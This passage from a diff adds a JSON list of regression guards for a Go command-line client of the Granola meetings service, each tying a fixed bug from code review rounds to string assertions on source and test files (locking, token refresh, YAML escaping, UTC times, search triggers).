+     "file": "cli/internal/cli/extract.go",
+     "contains": "if err := os.Rename(temps[i], o.path); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestExtractLeavesNoPartialTriple(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/extract.go",
+     "contains": "unlock, err := lockExtract(outDir, id)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestExtractRefusesWhileAnotherRunHoldsTheLock(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/extract.go",
+     "contains": "ok, err := tryLockFile(f)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/extract_lock_unix.go",
+     "contains": "syscall.Flock(int(f.Fd()), syscall.LOCK_EX|syscall.LOCK_NB)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/extract_lock_windows.go",
+     "contains": "windows.LockFileEx(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/extract.go",
+     "not_contains": "extractLockStale"
+    }
+   ]
+  },
+  {
+   "id": "duplicates-cross-source-identity",
+   "summary": "duplicates scan groups a stored meeting with its memo file by the id in the file name, or by title + the YYYY-MM-DD in the file name",
+   "why": "The generated fingerprint mixed in an attendee set the file side never carried and took the file's day from its mtime, so a meeting and its own memo could never land in one group (Codex full-PR review; the library pass had deferred it). Round 2: each stored meeting is its own identity (two same-title meetings on one day are two meetings), files are matched by the id they declare, and a title+day fallback is used only when exactly one stored meeting fits.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/duplicates.go",
+     "contains": "func fileTitleAndDay(name string, mtime time.Time) (string, string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestDuplicatesScanMatchesAMeetingToItsMemoFile(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/duplicates.go",
+     "contains": "rec := storeRec{id: id, title: d.Title, day: day, key: \"id:\" + id}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestDuplicatesScanKeepsDistinctMeetingsApart(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/duplicates.go",
+     "contains": "if b, rerr := r.ReadFile(native); rerr == nil {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-refresh-rotation-persistence",
+   "summary": "after a token refresh, the rotated refresh token is written to the Keychain first, with a retry, and every failed write is reported",
+   "why": "Granola retires the old refresh token on use. An access-token write failure used to stop the refresh token from ever being saved, losing the session on the next run, behind a soft warning (Codex full-PR review). Round 2: the expiry never advances when the access token was not saved (the next run refreshes), and a lost refresh token is returned as an error instead of a soft warning.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/granolamcp.go",
+     "contains": "if err := set(kcAcctRefresh, t.RefreshToken); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestStoreMCPTokenSavesRefreshTokenFirstAndReportsFailures(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granolamcp.go",
+     "contains": "exp = time.Unix(1, 0)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granolamcp.go",
+     "contains": "if errors.Is(serr, errRefreshNotSaved) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestStoreMCPTokenNeverAdvancesExpiryWithoutTheAccessToken(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "set-token-replaces-api-key",
+   "summary": "auth set-token saves the key in the api_key field AuthHeader prefers and clears access_token",
+   "why": "Saving it as access_token left an older stored api_key in place, and AuthHeader kept sending the old key (Codex full-PR review).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "func (c *Config) SaveAPIKey(token string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "if err := cfg.SaveAPIKey(token); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestSetTokenReplacesAStoredAPIKey(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "rest-helpers-honor-config",
+   "summary": "panel / transcript / meetings get REST helpers load the --config the command was given",
+   "why": "They called config.Load(\"\"), so `--config other.toml` was ignored and the default host and credentials were used (Codex full-PR review). Round 2: they honor --no-cache too.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/panel.go",
+     "not_contains": "config.Load(\"\")"
+    },
+    {
+     "file": "cli/internal/cli/transcript.go",
+     "not_contains": "config.Load(\"\")"
+    },
+    {
+     "file": "cli/internal/cli/meetings.go",
+     "not_contains": "config.Load(\"\")"
+    },
+    {
+     "file": "cli/internal/cli/granola_novels.go",
+     "contains": "granolaActiveFlags = flags",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestRESTHelpersHonorConfigFlag(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "contains": "func applyCachePolicy(c *client.Client) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestLeafRESTClientHonorsNoCache(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "rest-response-id-checked",
+   "summary": "every live detail fetch rejects a 200 whose id is a different meeting",
+   "why": "Hydration checked it, but the live transcript, summary, and meetings-get paths did not, so another meeting's transcript could be labelled as the requested one (Codex full-PR review).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/transcript.go",
+     "contains": "if d.ID != \"\" && d.ID != id {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/panel.go",
+     "contains": "if d.ID != \"\" && d.ID != id {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meetings.go",
+     "contains": "probe.ID != \"\" && probe.ID != id",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestLiveTranscriptRejectsAnotherMeetingsAnswer(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-auth-skips-auto-refresh",
+   "summary": "auto-refresh never runs in front of mcp-auth",
+   "why": "An auto-refresh before a 'passive' mcp-auth status could enrich private notes and so refresh and rotate the MCP tokens first (Codex full-PR review).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/autorefresh.go",
+     "contains": "\"mcp-auth\": {},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestMCPAuthSkipsAutoRefresh(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meetings-get-honors-live",
+   "summary": "meetings get --data-source live asks the API even when a stored copy exists",
+   "why": "It returned the possibly stale local record without a request (Codex full-PR review).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/meetings.go",
+     "contains": "live := flags.dataSource == \"live\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestMeetingsGetLiveSkipsStoredCopy(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-summary-stored-locally",
+   "summary": "hydration stores the AI summary (meeting_summaries table) so local exports include it; a failed live summary fetch is reported as a failure",
+   "why": "A local export always printed 'no AI panel available', and a 401/500 on the live summary fetch was swallowed and rendered the same way (Codex full-PR review). `panel get --data-source local` serves the stored summary too.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/granola/store_sync.go",
+     "contains": "CREATE TABLE IF NOT EXISTS meeting_summaries (",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "INSERT INTO meeting_summaries(meeting_id, summary_markdown, summary_text)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "func storedSummary(id string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestExportUsesStoredSummaryAndReportsFetchFailure(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/panel.go",
+     "contains": "md := storedSummary(id)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-auth-login-backfill-hint",
+   "summary": "mcp-auth login tells the user to run `enrich` to add private notes to meetings already synced; the docs carry the same step",
+   "why": "sync revisits a meeting only when Granola changes it, so after connecting MCP the documented sync -> login -> notes-show sequence left private notes missing (Codex full-PR review).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/mcp_auth.go",
+     "contains": "For meetings you already synced, run: granola-cli enrich",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "granola-cli enrich             # add private notes to meetings you already synced",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "stats-duration-ordered-bounds",
+   "summary": "stats duration aggregations count only meetings whose end is after their start",
+   "why": "Inverted bounds (possible after a partial bounds update) contributed negative minutes (Codex full-PR review, P2).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/stats.go",
+     "contains": "CAST(strftime('%s', ended_at) AS INTEGER) > CAST(strftime('%s', started_at) AS INTEGER)",
+     "min_count": 2,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "env-api-key-wins",
+   "summary": "an explicit GRANOLA_API_KEY in the environment is the credential sent, ahead of a stored auth_header",
+   "status": "active",
+   "why": "A stored auth_header kept being sent while Load reported env:GRANOLA_API_KEY as the source (Codex full-PR review round 2).",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if c.envOverrides[\"GranolaApiKey\"] && c.GranolaApiKey != \"\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestEnvAPIKeyWinsOverStoredAuthHeader(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "attendee-queries-distinct-meetings",
+   "summary": "attendee timeline and brief select meetings with EXISTS, so a meeting with two matching attendees appears once",
+   "status": "active",
+   "why": "The JOIN returned one row per matching attendee, so `attendee brief Smith --last 2` could return the same meeting twice and drop the older one (Codex full-PR review round 2).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/attendee.go",
+     "contains": "WHERE EXISTS (SELECT 1 FROM attendees a WHERE a.meeting_id = m.id AND (a.email LIKE ? OR a.name LIKE ?))",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestAttendeeBriefReturnsDistinctMeetings(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-notes-backfill-tracked",
+   "summary": "private-notes completion is tracked per meeting (human_notes_state); auto-refresh backfills up to 25 pending meetings per command without refetching REST detail",
+   "status": "active",
+   "why": "Eligibility depended only on REST timestamps, so meetings synced before MCP was connected, or whose MCP pass failed, were never asked again (Codex full-PR review round 2). Round 3: a meeting's notes and its completion state are written in one transaction; a meeting MCP lists no match for is recorded unresolved and retried after a day; match targets use the effective stored title/date, not a partial response's omitted fields. Round 4: EnsureSchema adds the resolved column to a human_notes_state table an earlier build created, keeping its rows.",
+   "asserts": [
+    {
+     "file": "cli/internal/granola/store_sync.go",
+     "contains": "CREATE TABLE IF NOT EXISTS human_notes_state (",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync_autorefresh.go",
+     "contains": "if pending, err := pendingHumanNoteTargets(ctx, db, autoRefreshEnrichCap()); err == nil && len(pending) > 0 {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestPendingHumanNotesAreTrackedApartFromREST(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mcp_notes.go",
+     "contains": "func recordHumanNotes(ctx context.Context, db *sql.DB, id, note string, present, resolved bool, checkedAt string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mcp_notes.go",
+     "contains": "AND (h.meeting_id IS NULL OR (h.resolved = 0 AND COALESCE(h.checked_at,'') < ?))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "targets = append(targets, effectiveRESTTarget(ctx, db, &d))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestRecordHumanNotesIsAtomic(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestUnresolvedHumanNotesAreRetriedAfterADay(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestEffectiveRESTTargetUsesStoredMetadata(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/granola/store_sync.go",
+     "contains": "`ALTER TABLE human_notes_state ADD COLUMN resolved INTEGER NOT NULL DEFAULT 0`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestEnsureSchemaUpgradesHumanNotesState(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mcp_notes.go",
+     "contains": "ORDER BY (h.meeting_id IS NOT NULL), COALESCE(h.checked_at,''), m.created_at DESC",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestBackfillAsksNeverAskedMeetingsFirst(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "yaml-metadata-escaped",
+   "summary": "metadata frontmatter escapes backslashes, quotes, and control characters in quoted scalars",
+   "status": "active",
+   "why": "A title such as `QBR: C:\\\\Users\\\\Alice` produced an invalid double-quoted YAML scalar (Codex full-PR review round 2, P2). Round 3: a title led by a YAML indicator ([, {, -, ?, ...) or padded with spaces is quoted too. Round 4: strings a YAML parser would retype (true, null, 2026, 1e3) are quoted. Round 5: every title and name is written as a double-quoted scalar; enumerating retyping cases kept missing some (dates such as 2026-10-13, empty strings).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/extract.go",
+     "contains": "case r == '\\\\':",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestYAMLEscapeBackslashes(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestYAMLEscapeQuotesIndicatorLedTitles(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "live-output-provenance",
+   "summary": "results fetched from the API (meetings get --data-source live, meetings fetch-batch, panel get, live transcript get) carry meta.source \"live\" in the --agent envelope",
+   "status": "active",
+   "why": "emitJSON always labelled meta.source \"local\", which SKILL.md tells agents to trust, so live data was mislabelled (Codex full-PR review round 3).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "contains": "func emitJSONSource(cmd *cobra.Command, flags *rootFlags, v any, source string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meetings.go",
+     "contains": "emitJSONSource(cmd, flags, v, \"live\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestLiveResultsCarryLiveProvenance(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcript.go",
+     "contains": "envSource = \"local\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestStoredTranscriptEnvelopeSaysLocal(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-notes-by-note-id",
+   "status": "active",
+   "summary": "private notes are fetched from Granola's official MCP by REST note id (get_meetings note_ids, one id per call), with meeting blocks matched loosely so extra tag attributes cannot break parsing",
+   "why": "The generated path listed meetings and matched them to REST meetings by title and date, with a regex that required the exact tag shape <meeting id title date>. Granola's list_meetings tag gained attributes (meeting_at, created_at, url, ...), the regex matched nothing, and every private note was silently dropped: proved on a live account, 0 of 150 meetings matched while get_meetings by note id returned their notes (149 of 150 after the fix). Fetching by note id also removes the title/date attribution heuristics the Codex review kept finding gaps in. Round 6: every MCP request carries the caller's context and the pass stops when it ends (a stalled server cannot hold a command for minutes); a failed call is recorded unresolved so the backfill moves on instead of re-selecting the same batch; an explicitly empty private_notes block clears notes the user deleted.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/mcp_notes.go",
+     "contains": "mcpToolCallCtx(ctx, access, sid, \"get_meetings\", map[string]any{\"note_ids\": []string{t.ID}})",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mcp_notes.go",
+     "contains": "mcpBlockRe   = regexp.MustCompile(`(?s)<meeting\\b([^>]*)>(.*?)</meeting>`)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mcp_notes.go",
+     "not_contains": "mcpToolCall(access, sid, \"list_meetings\""
+    },
+    {
+     "file": "cli/internal/cli/mcp_auth.go",
+     "contains": "pn, _, _ := privateNoteFromGetMeetings(gmText)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestPrivateNoteFromGetMeetingsReadsTheLiveFormat(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granolamcp.go",
+     "contains": "req, err := http.NewRequestWithContext(ctx, method, u, body)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mcp_notes.go",
+     "contains": "if err := recordHumanNotes(ctx, db, t.ID, \"\", false, false, checkedAt); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestExplicitEmptyPrivateNotesClear(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meeting-times-stored-utc",
+   "status": "active",
+   "summary": "meeting times are stored as whole-second UTC \"Z\" text, EnsureSchema rewrites any stored value not in that form (offsets and fractional seconds), and the thin-notes vs meetings freshness check compares instants; hydration keeps the API's full-precision updated_at as meetings.source_updated_at, the watermark that comparison uses",
+   "why": "Filters and ordering compare timestamps as TEXT, which is only chronological in one representation. Calendar times arrived with their offset (09:00-04:00), so `stats frequency --since 2026-10-13T12:00:00Z` excluded a 13:00 UTC meeting (Codex full-PR review round 6).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "startedAt, endedAt = utcRFC3339(startedAt), utcRFC3339(endedAt)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/granola/store_sync.go",
+     "contains": "var utcNormalizeSQL = []string{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestMeetingTimesAreStoredInUTC(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync_autorefresh.go",
+     "contains": "OR COALESCE(julianday(n.updated_at), 0) > COALESCE(julianday(m.source_updated_at), 0)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestTimestampMigrationCanonicalizesFractionalZ(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestIncrementalRefreshComparesInstants(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/granola/store_sync.go",
+     "contains": "`ALTER TABLE meetings ADD COLUMN source_updated_at TEXT NOT NULL DEFAULT ''`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "func freshnessWatermark(apiUpdatedAt string) string {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fts-maintained-by-triggers",
+   "status": "active",
+   "summary": "meetings_fts and transcript_fts are kept in step by SQLite triggers in each row write's own transaction; EnsureSchema installs them together with one full rebuild",
+   "why": "The index was rebuilt only after a whole hydration or private-notes pass, on the caller's context. A pass that failed or hit its deadline part way left written meetings unsearchable and cleared private notes still searchable (Codex full-PR review round 7).",
+   "asserts": [
+    {
+     "file": "cli/internal/granola/store_sync.go",
+     "contains": "CREATE TRIGGER IF NOT EXISTS meetings_fts_au AFTER UPDATE OF title, notes_plain ON meetings",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/granola/store_sync.go",
+     "contains": "CREATE TRIGGER IF NOT EXISTS transcript_fts_ad AFTER DELETE ON transcript_segments",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/granola/store_sync.go",
+     "contains": "if err := ensureFTSTriggers(ctx, db); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestPrivateNoteChangesReindexInTheSameWrite(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestEnsureSchemaReindexesALaggingStore(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestPartialHydrationStaysSearchable(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-token-calls-honor-context",
+   "status": "active",
+   "summary": "the MCP token exchange and refresh carry the caller's context (mcpForm, mcpRefresh, mcpExchange, mcpAccessToken take ctx)",
+   "why": "Refresh ran on no context, so a stalled token endpoint held an auto-refreshing command for the full 45s client timeout regardless of --timeout (Codex full-PR review round 7).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/granolamcp.go",
+     "contains": "func mcpForm(ctx context.Context, u string, form url.Values) (int, []byte, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granolamcp.go",
+     "contains": "func mcpAccessToken(ctx context.Context) (string, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestTokenEndpointHonorsTheCallerDeadline(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "incremental-sync-updated-after",
+   "status": "active",
+   "summary": "incremental notes sync filters with updated_after instead of the generator's created_after (generated sync.go, syncResourceSinceParam)",
+   "why": "created_after never re-lists a note created before the last sync and edited after it, so its thin updated_at never advanced and the edited transcript/notes/summary were never re-hydrated. Live account: updated_after returned a note created before the cutoff and edited after it that created_after missed (Codex full-PR review round 10). Prefer moving this into the spec at the next reprint.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "return \"updated_after\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestIncrementalSyncRelistsEditedNotes(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hydrate-continues-past-failures",
+   "status": "active",
+   "summary": "REST hydration continues past a note whose detail fetch fails (404, 5xx, bad body), records it in hydrate_failures, and auto-refresh queues failed notes last and retries them after a day; account-level failures (network, 401/403/429) stop the pass without blaming a note",
+   "why": "One deleted note aborted the pass before every later note, and auto-refresh re-selected it first on every command, starving the backlog (Codex full-PR review round 10).",
+   "asserts": [
+    {
+     "file": "cli/internal/granola/store_sync.go",
+     "contains": "CREATE TABLE IF NOT EXISTS hydrate_failures (",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "func recordHydrateFailure(ctx context.Context, db *sql.DB, id string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync_autorefresh.go",
+     "contains": "ORDER BY (f.note_id IS NOT NULL), COALESCE(f.failed_at, ''), julianday(n.updated_at) DESC",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestHydrationContinuesPastAFailedNote(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestAccountLevelFailureIsNotBlamedOnANote(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dry-run-never-writes-store",
+   "status": "active",
+   "summary": "REST hydration writes nothing for a --dry-run client, and auto-refresh is skipped under --dry-run",
+   "why": "The dry-run client answers every request with a {\"dry_run\":true} sentinel; auto-refresh hydrated it as an empty meeting stamped with a current watermark, so later refreshes skipped the real detail (Codex full-PR review round 10).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "if c.DryRun {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/autorefresh.go",
+     "contains": "if flags.dryRun {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestDryRunNeverWritesTheStore(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "preflight-exact-title-day",
+   "status": "active",
+   "summary": "the title+day duplicate rung (preflight, and the duplicates command's title rung) matches only an exact title under the '<YYYY-MM-DD> <Title> - <Org> - <Kind>' convention; a name that merely contains the title is reported, never gated",
+   "why": "Substring containment made 'Planning' gate (exit 3, memo run skips) on '2026-10-13 Budget Planning - Northwind - Full.md', and a bare prefix let 'Plan' claim 'Planning - Org - Full' in the duplicates report (Codex full-PR review round 11).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "func exactMemoTitleDay(stem, titleKey, day string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "if day != \"\" && exactMemoTitleDay(stem, titleKey, day) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/duplicates.go",
+     "contains": "if rec.day == day && exactMemoTitle(norm, rt) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestPreflightTitleDayRungNeedsAnExactTitle(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "stored-window-without-calendar-id",
+   "status": "active",
+   "summary": "the local cache reconstructs a meeting's stored start/end even when it has no calendar id, and meetings output omits an empty calendar_event_id",
+   "why": "Hydration keeps the scheduled window without a calendar id, but the cache dropped it unless an id was present, so extract wrote the transcript span and a shorter duration_min (Codex full-PR review round 11).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "contains": "if (calID.Valid && calID.String != \"\") || (startedAt.Valid && startedAt.String != \"\") || (endedAt.Valid && endedAt.String != \"\") {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meetings.go",
+     "contains": "if d.GoogleCalendarEvent != nil && d.GoogleCalendarEvent.ID != \"\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/codex_pr_review_fixes_test.go",
+     "contains": "func TestStoredWindowSurvivesWithoutCalendarID(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "window-provenance",
+   "status": "active",
+   "summary": "each stored meeting bound records its source (meetings.started_src / ended_src); a calendar bound always wins, and a transcript span only fills a bound that is empty or transcript-derived",
+   "why": "A partial response omitting calendar_event but carrying a transcript replaced the stored scheduled 09:00-10:00 window with the 09:05-09:55 span, so extract and duration stats reported 50 minutes instead of 60 (Codex full-PR review round 12).",
+   "asserts": [
+    {
+     "file": "cli/internal/granola/store_sync.go",
